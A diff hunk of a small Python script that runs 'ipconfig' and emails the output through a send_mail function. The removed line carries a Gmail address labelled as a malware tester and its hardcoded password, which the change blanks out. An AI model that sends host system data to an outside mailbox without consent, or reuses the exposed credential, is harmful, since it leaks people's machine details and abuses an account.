@@ -14,4 +14,4 @@ def send_mail(email, password, message):
 subject = "ipconfig info"
 command = "ipconfig"
 output = subprocess.check_output(command,shell=True)
-send_mail("emailmalwaretester@gmail.com","#$zKeK*8U4Q!V$7y",output)
+send_mail("","",output)
